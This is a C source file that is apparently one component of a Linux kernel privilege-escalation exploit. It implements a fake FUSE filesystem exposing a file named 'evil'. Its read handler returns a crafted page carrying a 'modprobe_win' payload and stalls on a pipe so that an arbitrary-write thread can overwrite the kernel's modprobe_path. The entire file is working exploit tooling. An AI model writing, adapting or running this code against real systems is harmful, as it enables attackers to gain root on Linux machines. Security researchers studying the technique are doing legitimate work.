#include "fakefuse.h"

const char *evil_path = "evil";

int fuse_pipes[2];

// https://www.maastaar.net/fuse/linux/filesystem/c/2016/05/21/writing-a-simple-filesystem-using-fuse/

int evil_read(const char *path, char *buf, size_t size, off_t offset,
              struct fuse_file_info *fi)
{
    // change to modprobe_path
    char signal;
    char evil_buffer[0x1000];
    memset(evil_buffer, 0x43, sizeof(evil_buffer));
    char *evil = modprobe_win;
    memcpy((void *)(evil_buffer + 0x1000-0x30), evil, sizeof(evil));

    size_t len = 0x1000;

    if (offset >= len)
        return size;

    if (offset + size > len)
        size = len - offset;

    memcpy(buf, evil_buffer + offset, size);

    // sync with the arb write thread
    read(fuse_pipes[0], &signal, 1);

    return size;
}

int evil_getattr(const char *path, struct stat *stbuf,
             struct fuse_file_info *fi)
{
    int res = 0;

    memset(stbuf, 0, sizeof(struct stat));

    if (strcmp(path, "/") == 0)
    {
        stbuf->st_mode = S_IFDIR | 0755;
        stbuf->st_nlink = 2;
    }
    else if (strcmp(path + 1, evil_path) == 0)
    {
        stbuf->st_mode = S_IFREG | 0444;
        stbuf->st_nlink = 1;
        stbuf->st_size = 0x1000;
    }
    else
    {
        res = -ENOENT;
    }

    return res;
}


int evil_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
             off_t offset, struct fuse_file_info *fi,
             enum fuse_readdir_flags flags)
{
    if (strcmp(path, "/") != 0)
        return -ENOENT;

    filler(buf, ".", NULL, 0, 0);
    filler(buf, "..", NULL, 0, 0);
    filler(buf, evil_path, NULL, 0, 0);

    return 0;
}